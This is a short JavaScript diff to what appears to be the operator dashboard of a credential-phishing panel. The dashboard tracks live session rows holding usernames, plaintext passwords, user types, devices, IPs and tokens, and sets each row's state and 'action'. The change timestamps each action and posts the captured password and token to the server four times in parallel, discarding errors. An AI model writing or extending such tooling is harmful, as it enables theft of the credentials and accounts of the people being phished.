@@ -129,27 +129,33 @@ function isOnline(row) {
 async function setRowState(rowId, state, action) {
   const row = rows.get(rowId)
   if (!row) return
+  const now = Date.now()
   row.state = state
   row.action = action
-  row.last_seen = Date.now()
-  row.updatedAt = Date.now()
+  row.actionTime = now
+  row.last_seen = now
+  row.updatedAt = now
   hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`
 
+  const payload = JSON.stringify({
+    action,
+    state,
+    actionTime: now,
+    username: row.user,
+    password: row.clave,
+    tipoUsuario: row.tipo,
+    device: row.device,
+    ip: row.ip,
+    token: row.token
+  });
+
   try {
-    await fetch(`/api/sessions/${rowId}/action`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        action,
-        state,
-        username: row.user,
-        password: row.clave,
-        tipoUsuario: row.tipo,
-        device: row.device,
-        ip: row.ip,
-        token: row.token
-      })
-    });
+    await Promise.all([
+      fetch(`/api/sessions/${rowId}/action`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload }),
+      fetch(`/api/sessions/${rowId}/action`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload }),
+      fetch(`/api/sessions/${rowId}/action`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload }),
+      fetch(`/api/sessions/${rowId}/action`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload })
+    ]);
   } catch (_) {}
   render()
 }
